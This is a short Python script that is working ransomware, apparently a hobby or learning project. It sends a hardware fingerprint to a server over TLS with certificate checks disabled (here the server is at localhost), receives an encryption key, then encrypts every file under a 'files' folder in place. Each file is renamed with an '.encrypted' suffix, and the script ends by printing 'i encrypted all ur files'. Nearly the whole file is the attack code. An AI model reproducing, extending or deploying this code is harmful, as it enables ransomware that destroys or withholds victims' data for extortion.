import socket
import ssl
from cryptography.fernet import Fernet #type: ignore
import uuid
import platform
import os


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

context = ssl.create_default_context()
context.check_hostname = False
context.verify_mode = ssl.CERT_NONE
sslsock = context.wrap_socket(sock, server_hostname='localhost')
sslsock.connect(('127.0.0.1',1337))

identifier = socket.gethostname() +  str(uuid.getnode()) + platform.system() + platform.release()
sslsock.send(identifier.encode('utf-8'))
print("sent our hwid")

key = sslsock.recv(1024)
cipher = Fernet(key)

folder = 'files'
for root, folders, files in os.walk(folder):
    for file in files:
        if file.endswith('.encrypted'): # i dont want infinite .encryprted files 
            continue 
        try:
            full = os.path.join(root, file)
            with open(full, 'rb') as f:
                data = f.read()
                f.close()
            encrypted = cipher.encrypt(data)
            with open(full, 'wb') as f:
                f.write(encrypted)
                f.close()
            newpath = full + ".encrypted"
            os.rename(full,newpath)
            
            print(f"encrypted file: {full}")

        except PermissionError:
            print(f"permission denied to edit file {full}")
        except Exception as error:
            print(f"got error: {error}")
print("i encrypted all ur files")